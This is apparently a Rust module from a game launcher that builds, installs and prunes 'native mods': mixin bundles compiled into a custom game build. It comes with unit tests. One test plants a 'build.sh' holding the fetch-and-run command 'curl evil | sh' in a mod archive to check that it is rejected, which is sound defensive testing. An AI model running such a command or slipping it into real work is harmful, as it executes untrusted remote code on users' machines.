//! Native mods (docs/native-mods.md), experimental and off by default: mixin bundles that
//! levzzz5154's horizon-mixins (MIT, <https://github.com/horizon-rust/horizon-mixins>) applies to
//! Horizon's source, which the launcher then compiles into a game of its own with its portable Rust
//! ([`rust_toolchain`]). Unlike `.hmod` mods they are not sandboxed: their code runs with the
//! player's rights.
//!
//! A native mod pins the Horizon revision it was made for (a Nightly's or a release's commit), and
//! every mod of one build must pin the same one. The build compiles that revision's source, from
//! GitHub, never a checkout on this computer, and installs as its own version,
//! `native-<revision>-<key>` (the key hashes the revision, the mods' files, the tool's commit and
//! the profile, so the same set builds once). It plays in its own instance, "Native mods", so a
//! mod never touches the player's worlds.
use crate::backend;
use crate::instances::{self, Instance};
use crate::rust_toolchain::{self, Toolchain};
use sha2::{Digest, Sha256};
use std::fs;
use std::io::{BufRead, BufReader, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

/// The Native mods instance's id (its folder in `instances/`) and name.
pub const INSTANCE: &str = "native-mods";
const NAME: &str = "Native mods";
const PREFIX: &str = "native-";
/// horizon-mixins, for bundles that don't name the revision they were tested with.
const MIXINS_GIT: &str = "https://github.com/horizon-rust/horizon-mixins";
pub const MIXINS_REV: &str = "0500ff24aa5933fca95a877ef41125353c4b4fe3";
/// The profile and features of the release's own game (game-build.yml).
const PROFILE: &str = "release";
const FEATURES: &str = "horizon-client/mods";

/// Whether an installed version is a native-mods build.
pub fn is_native(version: &str) -> bool {
    version.starts_with(PREFIX)
}

fn root() -> PathBuf {
    backend::data_dir().join("native")
}

/// The build's log, kept until the next build.
pub fn log_path() -> PathBuf {
    root().join("build.log")
}

const MANIFEST: &str = "horizon-mixin.toml";
/// A registry download's manifest (`.hnmod`, `horizon_mods::index::native`), beside `mixins/<id>/`.
const NATIVE_MANIFEST: &str = horizon_mods::index::native::MANIFEST;
/// Where an instance keeps the native mods installed from the registry, `<id>.hnmod`, each on or
/// off in `horizon-mods.txt` like any mod.
pub const INSTALLED: &str = "horizon-native-mods";

/// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
/// Each `.hnmod` is checked again as the registry checks it (only `.rs` and `.toml` under
/// `mixins/<id>/`, nothing run), so a file edited since its download can't smuggle anything else in.
pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
    let out = root().join("installed.incoming");
    let _ = fs::remove_dir_all(&out);
    let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
        .map(|dir| dir.flatten().map(|e| e.path()).collect())
        .unwrap_or_default();
    paths.retain(|p| p.extension().is_some_and(|e| e == "hnmod"));
    paths.sort();
    let mut count = 0;
    for path in paths {
        let bundle = horizon_mods::index::native::Bundle::read(&path)
            .map_err(|e| format!("{}: {e}", path.display()))?;
        if !crate::browser::java::is_enabled(home, &bundle.manifest.id) {
            continue;
        }
        let dir = out.join(&bundle.manifest.id);
        for (name, bytes) in &bundle.files {
            let to = dir.join(name);
            fs::create_dir_all(to.parent().unwrap_or(&dir)).map_err(|e| e.to_string())?;
            fs::write(&to, bytes).map_err(|e| format!("{}: {e}", to.display()))?;
        }
        count += 1;
    }
    if count == 0 {
        return Err(format!(
            "No native mod is turned on in {}: install one from the Mods page first.",
            home.join(INSTALLED).display()
        ));
    }
    Ok(out)
}

/// A mixin bundle: a folder with a `horizon-mixin.toml`, and the revisions it pins.
#[derive(Clone, Debug, PartialEq)]
pub struct Bundle {
    pub id: String,
    pub version: String,
    pub dir: PathBuf,
    /// The Horizon commit it builds on (`[compatibility] horizon_revision`, or its `.hnmod`'s).
    pub horizon: Option<String>,
    /// The horizon-mixins commit it was tested with (its `.hnmod`'s).
    pub mixins: Option<String>,
}

/// The bundles in `folder`: the folder itself when it is one (a `horizon-mixin.toml`, or an
/// unpacked `.hnmod`: `horizon-native.json` and `mixins/<id>/`), else each of its subfolders that is.
pub fn bundles(folder: &Path) -> Result<Vec<Bundle>, String> {
    if let Some(found) = bundle_in(folder)? {
        return Ok(vec![found]);
    }
    let mut dirs: Vec<PathBuf> = fs::read_dir(folder)
        .map_err(|e| format!("Could not read {}: {e}", folder.display()))?
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.is_dir())
        .collect();
    dirs.sort();
    let mut found = Vec::new();
    for dir in dirs {
        found.extend(bundle_in(&dir)?);
    }
    if found.is_empty() {
        return Err(format!(
            "{} holds no native mod ({MANIFEST} or {NATIVE_MANIFEST}).",
            folder.display()
        ));
    }
    Ok(found)
}

fn bundle_in(dir: &Path) -> Result<Option<Bundle>, String> {
    if dir.join(MANIFEST).is_file() {
        return bundle(dir, None).map(Some);
    }
    let path = dir.join(NATIVE_MANIFEST);
    if !path.is_file() {
        return Ok(None);
    }
    let text = fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))?;
    let native: serde_json::Value =
        serde_json::from_str(&text).map_err(|e| format!("{}: {e}", path.display()))?;
    let field = |name: &str| native[name].as_str().map(str::to_owned);
    let id = field("id").ok_or_else(|| format!("{} has no id.", path.display()))?;
    let found = bundle(&dir.join("mixins").join(&id), field("mixins"))?;
    match (&found.horizon, field("horizon")) {
        (Some(pinned), Some(native)) if *pinned != native => Err(format!(
            "{id}: {NATIVE_MANIFEST} pins Horizon {native}, its {MANIFEST} {pinned}."
        )),
        (_, native) => Ok(Some(Bundle {
            horizon: found.horizon.clone().or(native),
            ..found
        })),
    }
}

fn bundle(dir: &Path, mixins: Option<String>) -> Result<Bundle, String> {
    let path = dir.join(MANIFEST);
    let text = fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))?;
    let value: toml::Table = text
        .parse()
        .map_err(|e| format!("{}: {e}", path.display()))?;
    let field = |table: &str, name: &str| {
        value
            .get(table)
            .and_then(|m| m.get(name))
            .and_then(|v| v.as_str())
            .map(str::to_owned)
    };
    let need = |name: &str| {
        field("mod", name).ok_or_else(|| format!("{} has no [mod] {name}.", path.display()))
    };
    Ok(Bundle {
        id: need("id")?,
        version: need("version")?,
        dir: dir.to_owned(),
        horizon: field("compatibility", "horizon_revision"),
        mixins,
    })
}

fn is_revision(text: &str) -> bool {
    text.len() == 40 && text.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
}

/// The one value the bundles pin for `which` (each mod's `get`), else `fallback`; mods that pin
/// different ones can't be built together, and the error says which.
fn agreed(
    bundles: &[Bundle],
    which: &str,
    get: impl Fn(&Bundle) -> Option<&String>,
    fallback: impl FnOnce() -> Result<String, String>,
) -> Result<String, String> {
    let mut pins: Vec<(&String, &str)> = bundles
        .iter()
        .filter_map(|b| get(b).map(|r| (r, b.id.as_str())))
        .collect();
    pins.sort();
    let revision = match pins.first() {
        None => fallback()?,
        Some((first, _)) if pins.iter().all(|(r, _)| r == first) => (*first).clone(),
        Some(_) => {
            let list: Vec<String> = pins
                .iter()
                .map(|(r, id)| format!("{id} → {}", &r[..r.len().min(7)]))
                .collect();
            return Err(format!(
                "These mods were made for different {which} revisions and can't be built together: {}. Install versions made for the same Nightly.",
                list.join(", ")
            ));
        }
    };
    if !is_revision(&revision) {
        return Err(format!(
            "{revision} is not a {which} commit (40 hex digits)."
        ));
    }
    Ok(revision)
}

/// The Horizon commit `version` (an installed release or Nightly) was built from, from GitHub.
pub fn revision_of(version: &str) -> Result<String, String> {
    let reference = match version.strip_prefix("nightly-") {
        // nightly-2026-10-28-0c02067: the commit is its last word.
        Some(rest) => rest.rsplit('-').next().unwrap_or(rest),
        None => version,
    };
    let url = format!(
        "https://api.github.com/repos/{}/commits/{reference}",
        backend::REPO
    );
    let commit: serde_json::Value = backend::get(&url)?.into_json().map_err(|e| e.to_string())?;
    commit["sha"]
        .as_str()
        .filter(|s| is_revision(s))
        .map(str::to_owned)
        .ok_or_else(|| format!("GitHub doesn't know the commit of {version}."))
}

/// Every file under `dir`, by its path relative to `dir` (with `/`), sorted. A symlink is refused:
/// horizon-mixins refuses them too.
fn files(dir: &Path) -> Result<Vec<(String, PathBuf)>, String> {
    fn walk(root: &Path, dir: &Path, out: &mut Vec<(String, PathBuf)>) -> Result<(), String> {
        for entry in fs::read_dir(dir).map_err(|e| e.to_string())?.flatten() {
            let (path, kind) = (entry.path(), entry.file_type().map_err(|e| e.to_string())?);
            if kind.is_symlink() {
                return Err(format!(
                    "{} is a link: copy the file instead.",
                    path.display()
                ));
            } else if kind.is_dir() {
                walk(root, &path, out)?;
            } else {
                let relative = path.strip_prefix(root).unwrap_or(&path);
                out.push((relative.to_string_lossy().replace('\\', "/"), path));
            }
        }
        Ok(())
    }
    let mut out = Vec::new();
    walk(dir, dir, &mut out)?;
    out.sort();
    Ok(out)
}

/// The installed version `bundles` built on Horizon `revision` with horizon-mixins `mixins`
/// become: `native-<7 digits of the revision>-<12 hex digits>`.
pub fn version_for(revision: &str, mixins: &str, bundles: &[Bundle]) -> Result<String, String> {
    let mut hash = Sha256::new();
    for part in [mixins, PROFILE, FEATURES, rust_toolchain::VERSION, revision] {
        hash.update(part.as_bytes());
        hash.update([0]);
    }
    let mut sorted: Vec<&Bundle> = bundles.iter().collect();
    sorted.sort_by(|a, b| a.id.cmp(&b.id));
    for b in sorted {
        hash.update(b.id.as_bytes());
        hash.update([0]);
        for (name, path) in files(&b.dir)? {
            let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
            hash.update(name.as_bytes());
            hash.update((bytes.len() as u64).to_le_bytes());
            hash.update(&bytes);
        }
    }
    let key: String = hash.finalize()[..6]
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    Ok(format!("{PREFIX}{}-{key}", &revision[..7]))
}

/// Where a build is.
#[derive(Clone, Debug, PartialEq)]
pub enum Step {
    Rust(f32),
    Tool,
    Source(String),
    Mixins,
    /// Crates compiled so far, and the last one.
    Compile(usize, String),
    Install,
}

impl Step {
    pub fn label(&self) -> String {
        match self {
            Self::Rust(done) => format!(
                "Downloading Rust {} (once): {:.0}%",
                rust_toolchain::VERSION,
                done * 100.0
            ),
            Self::Tool => "Building horizon-mixins (once)".into(),
            Self::Source(revision) => {
                format!("Downloading Horizon's source at {}", &revision[..7])
            }
            Self::Mixins => "Applying the mixins".into(),
            Self::Compile(n, name) => format!("Compiling the game: {n} crates, now {name}"),
            Self::Install => "Installing the build".into(),
        }
    }
}

/// Runs `cmd`, its output appended to the build log; `line` sees each line of its standard error.
/// An error ends with the last lines.
fn run(mut cmd: Command, what: &str, mut line: impl FnMut(&str)) -> Result<(), String> {
    let mut log = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_path())
        .map_err(|e| e.to_string())?;
    let _ = writeln!(log, "$ {cmd:?}");
    let stdout = log.try_clone().map_err(|e| e.to_string())?;
    let mut child = cmd
        .stdout(stdout)
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("Could not start {what}: {e}"))?;
    let mut tail = std::collections::VecDeque::new();
    for text in BufReader::new(child.stderr.take().expect("piped"))
        .lines()
        .map_while(Result::ok)
    {
        let _ = writeln!(log, "{text}");
        line(&text);
        if tail.len() == 12 {
            tail.pop_front();
        }
        tail.push_back(text);
    }
    let status = child.wait().map_err(|e| e.to_string())?;
    if status.success() {
        return Ok(());
    }
    let tail: Vec<String> = tail.into();
    Err(format!(
        "{what} failed ({status}). The end of its output, the whole of it in {}:\n{}",
        log_path().display(),
        diagnostic(&tail.join("\n")).unwrap_or_else(|| tail.join("\n"))
    ))
}

/// A horizon-mixins diagnostic (`{"code", "message", "file"}`) in one line.
fn diagnostic(text: &str) -> Option<String> {
    let start = text.find('{')?;
    let value: serde_json::Value = serde_json::from_str(&text[start..]).ok()?;
    let mut line = format!(
        "{}: {}",
        value["code"].as_str()?,
        value["message"].as_str()?
    );
    if let Some(file) = value["file"].as_str() {
        line += &format!(" ({file})");
    }
    Some(line)
}

/// horizon-mixins at commit `rev`, built once with the launcher's cargo (`cargo install --locked`).
fn tool(rust: &Toolchain, rev: &str) -> Result<PathBuf, String> {
    let dir = root().join("tools").join(&rev[..12]);
    let bin = dir
        .join("bin")
        .join(format!("horizon-mixins{}", std::env::consts::EXE_SUFFIX));
    if !bin.is_file() {
        let mut cmd = rust.command(&rust.cargo());
        cmd.args([
            "install", "--locked", "--git", MIXINS_GIT, "--rev", rev, "--root",
        ])
        .arg(&dir)
        .arg("horizon-mixins-cli");
        run(cmd, "Building horizon-mixins", |_| {})?;
    }
    Ok(bin)
}

/// Horizon's source at commit `revision`: GitHub's archive of it, unpacked once, with the commit in
/// `.horizon-revision` (bundles pin it). A Nightly's commit stays downloadable after the Nightly
/// is gone: its `nightly-source/…` tag keeps it (docs/release-flow.md). Links are left out:
/// horizon-mixins refuses them, and none is needed to build.
fn source(revision: &str) -> Result<PathBuf, String> {
    let dir = root().join("source").join(revision);
    if dir.join(".horizon-revision").is_file() {
        return Ok(dir);
    }
    let archive = format!(
        "https://codeload.github.com/{}/tar.gz/{revision}",
        backend::REPO
    );
    let partial = root().join("source").join(format!(".{revision}.partial"));
    let _ = fs::remove_dir_all(&partial);
    fs::create_dir_all(&partial).map_err(|e| e.to_string())?;
    let reader = flate2::read::GzDecoder::new(backend::get(&archive)?.into_reader());
    let mut tar = tar::Archive::new(reader);
    for entry in tar.entries().map_err(|e| e.to_string())? {
        let mut entry = entry.map_err(|e| format!("Download interrupted: {e}"))?;
        let kind = entry.header().entry_type();
        if !(kind.is_file() || kind.is_dir()) {
            continue;
        }
        entry
            .unpack_in(&partial)
            .map_err(|e| format!("Could not unpack the source: {e}"))?;
    }
    // The archive's one top folder (horizon-<commit>/) is the source's root.
    let top = fs::read_dir(&partial)
        .map_err(|e| e.to_string())?
        .flatten()
        .map(|e| e.path())
        .find(|p| p.is_dir())
        .ok_or("The source archive is empty.")?;
    fs::write(top.join(".horizon-revision"), revision).map_err(|e| e.to_string())?;
    let _ = fs::remove_dir_all(&dir);
    fs::rename(&top, &dir).map_err(|e| e.to_string())?;
    let _ = fs::remove_dir_all(&partial);
    Ok(dir)
}

/// Makes `to` hold `from`'s files, writing only those that changed, so Cargo, which goes by file
/// times, recompiles only what the mods changed.
fn sync(from: &Path, to: &Path) -> Result<(), String> {
    let new = files(from)?;
    let old = if to.is_dir() { files(to)? } else { Vec::new() };
    for (name, path) in &new {
        let target = to.join(name);
        if fs::read(&target).ok() != fs::read(path).ok() {
            fs::create_dir_all(target.parent().unwrap_or(to)).map_err(|e| e.to_string())?;
            fs::copy(path, &target).map_err(|e| format!("{}: {e}", target.display()))?;
        }
    }
    for (name, path) in old {
        if new.binary_search_by(|(n, _)| n.cmp(&name)).is_err() {
            let _ = fs::remove_file(path);
        }
    }
    Ok(())
}

/// Builds `folder`'s mods on the Horizon revision they pin (else `base`'s, the installed version
/// whose game files the build reuses) and points `instance` at the build: the instance the mods
/// were installed in, else (None, or the game's own home) the Native mods instance. Returns the
/// build's version; a build already made is used again.
pub fn build(
    base: &str,
    folder: &Path,
    instance: Option<&Instance>,
    progress: impl Fn(Step),
) -> Result<String, String> {
    backend::need_prepared(base)?;
    fs::create_dir_all(root()).map_err(|e| e.to_string())?;
    let _ = fs::write(log_path(), "");
    // The mods are copied first: the build and its key use the copy, whatever happens to the
    // folder meanwhile.
    let incoming = root().join("mods.incoming");
    let _ = fs::remove_dir_all(&incoming);
    let found = bundles(folder)?;
    for b in &found {
        backend::copy_dir(&b.dir, &incoming.join(&b.id)).map_err(|e| e.to_string())?;
    }
    let mods: Vec<Bundle> = found
        .into_iter()
        .map(|b| Bundle {
            dir: incoming.join(&b.id),
            ..b
        })
        .collect();
    let revision = agreed(
        &mods,
        "Horizon",
        |b| b.horizon.as_ref(),
        || revision_of(base),
    )?;
    let mixins = agreed(
        &mods,
        "horizon-mixins",
        |b| b.mixins.as_ref(),
        || Ok(MIXINS_REV.into()),
    )?;
    let version = version_for(&revision, &mixins, &mods)?;
    if !backend::installed().contains(&version) {
        rust_toolchain::linker()?;
        let rust = rust_toolchain::install(|f| progress(Step::Rust(f)))?;
        progress(Step::Tool);
        let tool = tool(&rust, &mixins)?;
        progress(Step::Source(revision.clone()));
        let source = source(&revision)?;
        progress(Step::Mixins);
        // horizon-mixins refuses an output path through a link (macOS's /tmp is one).
        let real = root().canonicalize().map_err(|e| e.to_string())?;
        let fresh = real.join("stage.new");
        let _ = fs::remove_dir_all(&fresh);
        let mut apply = Command::new(&tool);
        apply.arg("apply").arg("--workspace").arg(&source);
        apply.arg("--mods").arg(&incoming).arg("--out").arg(&fresh);
        run(apply, "horizon-mixins", |_| {})?;
        let stage = root().join("stage");
        sync(&fresh, &stage)?;
        let _ = fs::remove_dir_all(&fresh);
        let target = root().join("target");
        let mut compile = rust.command(&rust.cargo());
        compile.current_dir(&stage).env("CARGO_TARGET_DIR", &target);
        compile.args([
            "build",
            "--locked",
            "--profile",
            PROFILE,
            "--features",
            FEATURES,
        ]);
        compile.args(["-p", "horizon-client", "--bin", "horizon-client"]);
        let mut crates = 0;
        run(compile, "Compiling the game", |line| {
            if let Some(name) = line.trim_start().strip_prefix("Compiling ") {
                crates += 1;
                let name = name.split_whitespace().next().unwrap_or(name);
                progress(Step::Compile(crates, name.to_owned()));
            }
        })?;
        progress(Step::Install);
        let about = serde_json::json!({
            "base": base,
            "horizon": revision,
            "horizon_mixins": mixins,
            "rust": rust_toolchain::VERSION,
            "mods": mods.iter().map(|m| serde_json::json!({"id": m.id, "version": m.version})).collect::<Vec<_>>(),
        });
        let binary = target.join(PROFILE).join(backend::CLIENT);
        install(base, &version, &binary, &about)?;
    }
    match instance.filter(|i| i.kind != instances::Kind::Default) {
        Some(own) => instances::edit(&own.id, |meta| meta.version = Some(version.clone()))?,
        None => instance_on(&version)?,
    };
    prune(&version);
    let _ = fs::remove_dir_all(&incoming);
    Ok(version)
}

/// Installs `binary` as version `version`: a copy of installed version `base`'s folder (its
/// resources included; cloned where the disk can) with the built game in place of `base`'s.
fn install(
    base: &str,
    version: &str,
    binary: &Path,
    about: &serde_json::Value,
) -> Result<(), String> {
    let from = backend::version_dir(base);
    let partial = backend::version_dir(&format!(".{version}.partial"));
    let _ = fs::remove_dir_all(&partial);
    fs::create_dir_all(&partial).map_err(|e| e.to_string())?;
    for entry in fs::read_dir(&from).map_err(|e| e.to_string())?.flatten() {
        let name = entry.file_name();
        if [
            backend::CLIENT,
            ".installed",
            "Horizon.app",
            "native-mods.json",
        ]
        .iter()
        .any(|n| name == *n)
        {
            continue;
        }
        let to = partial.join(&name);
        let copied = if entry.path().is_dir() {
            backend::copy_dir(&entry.path(), &to)
        } else {
            horizon_prepare::clone_or_copy(&entry.path(), &to)
        };
        copied.map_err(|e| format!("Could not copy {}: {e}", entry.path().display()))?;
    }
    let client = partial.join(backend::CLIENT);
    fs::copy(binary, &client).map_err(|e| format!("The built game: {e}"))?;
    fs::write(partial.join("native-mods.json"), about.to_string()).map_err(|e| e.to_string())?;
    let dir = backend::version_dir(version);
    let _ = fs::remove_dir_all(&dir);
    fs::rename(&partial, &dir).map_err(|e| e.to_string())?;
    fs::write(dir.join(".installed"), "").map_err(|e| e.to_string())
}

/// The Native mods instance, made empty the first time, playing `version`.
fn instance_on(version: &str) -> Result<Instance, String> {
    if instances::find(INSTANCE).is_err() {
        instances::create(NAME, None)?;
    }
    instances::edit(INSTANCE, |meta| meta.version = Some(version.to_owned()))
}

/// Removes the native builds other than `keep` that no instance plays. The compiled crates
/// (`native/target`) stay, so the next build only compiles what changed.
pub fn prune(keep: &str) {
    let played: Vec<String> = instances::list()
        .into_iter()
        .filter_map(|i| i.version)
        .collect();
    for old in backend::installed() {
        if is_native(&old) && old != keep && !played.contains(&old) {
            let _ = backend::remove(&old);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn dir(name: &str) -> PathBuf {
        let d = std::env::temp_dir().join(format!("horizon-native-{name}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&d);
        fs::create_dir_all(&d).unwrap();
        d
    }

    fn write_bundle(at: &Path, id: &str, helper: &str) {
        fs::create_dir_all(at).unwrap();
        let manifest = format!("[mod]\nid = \"{id}\"\nversion = \"0.1.0\"\n");
        fs::write(at.join(MANIFEST), manifest).unwrap();
        fs::write(at.join("hook.rs"), helper).unwrap();
    }

    #[test]
    fn a_folder_is_one_bundle_or_a_folder_of_them() {
        let one = dir("one");
        write_bundle(&one, "hello", "fn hook() {}");
        let found = bundles(&one).unwrap();
        assert_eq!(
            (found[0].id.as_str(), found[0].version.as_str()),
            ("hello", "0.1.0")
        );
        let many = dir("many");
        write_bundle(&many.join("b"), "beta", "fn hook() {}");
        write_bundle(&many.join("a"), "alpha", "fn hook() {}");
        fs::create_dir_all(many.join("notes")).unwrap();
        let ids: Vec<String> = bundles(&many).unwrap().into_iter().map(|b| b.id).collect();
        assert_eq!(ids, ["alpha", "beta"]);
        assert!(bundles(&many.join("notes")).is_err());
    }

    const A: &str = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const B: &str = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

    /// An unpacked `.hnmod`, as the registry ships one (horizon_mods::index::native).
    fn write_native(at: &Path, id: &str, horizon: &str, mixins: &str) {
        let manifest = serde_json::json!({"schema": 1, "id": id, "version": "0.3.0", "game": "26.3",
            "horizon": horizon, "mixins": mixins});
        fs::create_dir_all(at.join("mixins").join(id)).unwrap();
        fs::write(at.join(NATIVE_MANIFEST), manifest.to_string()).unwrap();
        let toml = format!("[mod]\nid = \"{id}\"\nversion = \"0.3.0\"\n[compatibility]\nhorizon_revision = \"{horizon}\"\n");
        fs::write(at.join("mixins").join(id).join(MANIFEST), toml).unwrap();
    }

    #[test]
    fn a_registry_download_is_a_bundle_with_its_pins() {
        let d = dir("hnmod");
        write_native(&d.join("veinminer"), "veinminer", A, B);
        write_bundle(&d.join("local"), "hello", "fn hook() {}");
        let found = bundles(&d).unwrap();
        assert_eq!(found.len(), 2);
        assert_eq!(found[1].id, "veinminer");
        assert_eq!(found[1].dir, d.join("veinminer/mixins/veinminer"));
        assert_eq!(found[1].horizon.as_deref(), Some(A));
        assert_eq!(found[1].mixins.as_deref(), Some(B));
        assert_eq!(
            (found[0].horizon.as_ref(), found[0].mixins.as_ref()),
            (None, None)
        );
    }

    #[test]
    fn installed_mods_are_the_checked_files_of_those_turned_on() {
        let d = dir("installed-src");
        write_native(&d, "veinminer", A, B);
        let home = dir("installed-home");
        fs::create_dir_all(home.join(INSTALLED)).unwrap();
        let pack = |name: &str, extra: Option<(&str, &str)>| {
            let mut zip =
                zip::ZipWriter::new(fs::File::create(home.join(INSTALLED).join(name)).unwrap());
            let options = zip::write::SimpleFileOptions::default();
            for file in [NATIVE_MANIFEST, "mixins/veinminer/horizon-mixin.toml"] {
                zip.start_file(file, options).unwrap();
                zip.write_all(&fs::read(d.join(file)).unwrap()).unwrap();
            }
            if let Some((file, body)) = extra {
                zip.start_file(file, options).unwrap();
                zip.write_all(body.as_bytes()).unwrap();
            }
            zip.finish().unwrap();
        };
        pack("veinminer.hnmod", None);
        assert!(installed_mods(&home).is_err(), "off until turned on");
        crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
        let out = installed_mods(&home).unwrap();
        let found = bundles(&out).unwrap();
        assert_eq!(
            (found[0].id.as_str(), found[0].horizon.as_deref()),
            ("veinminer", Some(A))
        );
        pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
        assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
    }

    #[test]
    fn the_mods_of_one_build_pin_one_revision() {
        let pinned = |id: &str, horizon: Option<&str>| Bundle {
            id: id.into(),
            version: "1".into(),
            dir: PathBuf::new(),
            horizon: horizon.map(str::to_owned),
            mixins: None,
        };
        let never = || -> Result<String, String> { panic!("a pin wins") };
        fn get(b: &Bundle) -> Option<&String> {
            b.horizon.as_ref()
        }
        let same = [
            pinned("a", Some(A)),
            pinned("b", None),
            pinned("c", Some(A)),
        ];
        assert_eq!(agreed(&same, "Horizon", get, never).unwrap(), A);
        let none = [pinned("a", None)];
        assert_eq!(agreed(&none, "Horizon", get, || Ok(B.into())).unwrap(), B);
        let split = [pinned("veinminer", Some(A)), pinned("minimap", Some(B))];
        let err = agreed(&split, "Horizon", get, never).unwrap_err();
        assert!(
            err.contains("veinminer → aaaaaaa") && err.contains("minimap → bbbbbbb"),
            "{err}"
        );
        let bad = [pinned("a", Some("nightly"))];
        assert!(agreed(&bad, "Horizon", get, never).is_err());
    }

    #[test]
    fn the_version_changes_with_the_revision_and_any_file_of_the_mods() {
        let d = dir("key");
        write_bundle(&d, "hello", "fn hook() {}");
        let key =
            |revision: &str| version_for(revision, MIXINS_REV, &bundles(&d).unwrap()).unwrap();
        let first = key(A);
        assert!(
            first.starts_with("native-aaaaaaa-") && first.len() == "native-aaaaaaa-".len() + 12
        );
        assert!(is_native(&first) && !backend::is_game_tag(&first));
        assert_eq!(first, key(A));
        assert_ne!(first, key(B));
        assert_ne!(first, version_for(A, B, &bundles(&d).unwrap()).unwrap());
        fs::write(d.join("hook.rs"), "fn hook() { let _ = 1; }").unwrap();
        assert_ne!(first, key(A));
    }

    #[test]
    fn only_changed_files_are_written_again() {
        let (from, to) = (dir("sync-from"), dir("sync-to"));
        fs::create_dir_all(from.join("src")).unwrap();
        fs::write(from.join("src/a.rs"), "a").unwrap();
        fs::write(from.join("src/b.rs"), "b2").unwrap();
        fs::create_dir_all(to.join("src")).unwrap();
        fs::write(to.join("src/a.rs"), "a").unwrap();
        fs::write(to.join("src/b.rs"), "b").unwrap();
        fs::write(to.join("gone.rs"), "x").unwrap();
        let before = fs::metadata(to.join("src/a.rs"))
            .unwrap()
            .modified()
            .unwrap();
        std::thread::sleep(std::time::Duration::from_millis(20));
        sync(&from, &to).unwrap();
        assert_eq!(
            fs::metadata(to.join("src/a.rs"))
                .unwrap()
                .modified()
                .unwrap(),
            before
        );
        assert_eq!(fs::read_to_string(to.join("src/b.rs")).unwrap(), "b2");
        assert!(!to.join("gone.rs").exists());
    }

    #[test]
    fn tool_errors_read_in_one_line() {
        let err = "{\n  \"code\": \"E_REVISION\",\n  \"message\": \"requires exact Horizon revision a\",\n  \"file\": \"m.toml\"\n}";
        assert_eq!(
            diagnostic(err).as_deref(),
            Some("E_REVISION: requires exact Horizon revision a (m.toml)")
        );
    }
}
